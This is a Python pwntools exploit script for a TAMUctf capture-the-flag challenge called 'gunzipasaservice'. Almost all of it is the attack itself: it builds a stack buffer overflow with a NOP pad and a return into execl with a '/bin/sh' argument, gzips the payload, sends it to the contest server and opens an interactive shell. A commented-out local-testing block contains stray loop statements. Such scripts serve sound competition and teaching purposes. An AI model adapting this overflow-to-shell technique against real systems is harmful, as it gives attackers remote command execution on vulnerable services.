from pwn import *
import os



#p = process('./gunzipasaservice')
p = remote('challenges.tamuctf.com', 4709)
fw = open('payload', 'wb')

bufSize = 0x414
payload = '\x90'*bufSize

payload += 'B'*4 
payload += p32(0x8049298) + p32(0x804A00E) + p32(0) #address of execl + /bin/sh + 0
fw.write(payload)

fw.close()
os.system('gzip -f payload')
fr = open('payload.gz', 'rb')
payload = ''.join(fr.readlines())

p.send(payload)


res = p.recvrepeat(0.2)
print 'res: ' + res.encode('hex')
'''
#only in local
state = p.poll()
print 'state: ' + str(state)
if state == None:
    print '2222222'
    break
else:
    print '1111111'
    p.close()
    continue
'''

p.interactive()

